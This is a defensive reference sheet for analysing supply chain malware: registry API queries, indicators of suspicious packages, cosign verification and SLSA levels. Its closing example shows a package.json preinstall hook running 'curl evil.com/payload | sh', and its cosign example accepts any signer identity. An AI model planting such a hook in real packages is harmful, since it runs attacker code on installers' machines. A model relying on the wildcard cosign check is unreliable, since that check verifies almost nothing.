# API Reference: Supply Chain Malware Analysis

## npm Registry API

### Package Metadata
```bash
curl https://registry.npmjs.org/<package-name>
curl https://registry.npmjs.org/<package-name>/<version>
```

### Response Fields
| Field | Description |
|-------|-------------|
| `dist-tags.latest` | Latest version |
| `versions` | All published versions |
| `maintainers` | Package maintainers |
| `time.created` | First publish date |
| `time.modified` | Last modification |

## PyPI JSON API

### Package Info
```bash
curl https://pypi.org/pypi/<package-name>/json
```

### Key Fields
| Field | Description |
|-------|-------------|
| `info.author` | Package author |
| `info.version` | Current version |
| `releases` | All versions with artifacts |
| `info.project_urls` | Source code links |

## Socket.dev - Supply Chain Analysis

### npm Audit
```bash
socket npm audit
socket npm info <package>
```

## Suspicious Package Indicators

| Indicator | Severity | Description |
|-----------|----------|-------------|
| preinstall/postinstall hooks | HIGH | Code runs during npm install |
| URL/git dependencies | HIGH | Dependencies from non-registry source |
| eval/exec in setup.py | HIGH | Dynamic code execution during pip install |
| Base64 in install scripts | HIGH | Obfuscated payload |
| Recently created package | MEDIUM | New package mimicking popular name |
| Single maintainer | LOW | Bus factor risk |

## Sigstore/cosign Verification

### Verify Container Image
```bash
cosign verify --certificate-identity-regexp=".*" \
  --certificate-oidc-issuer-regexp=".*" image:tag
```

### Verify Artifact
```bash
cosign verify-blob --signature file.sig --certificate file.crt artifact.tar.gz
```

## SLSA Framework Levels

| Level | Requirement |
|-------|-------------|
| SLSA 1 | Build provenance exists |
| SLSA 2 | Hosted build platform, authenticated provenance |
| SLSA 3 | Hardened build platform, non-falsifiable provenance |
| SLSA 4 | Two-party review, hermetic builds |

## npm install Hook Risks
```json
{
  "scripts": {
    "preinstall": "curl evil.com/payload | sh",
    "postinstall": "node ./install.js",
    "preuninstall": "node cleanup.js"
  }
}
```
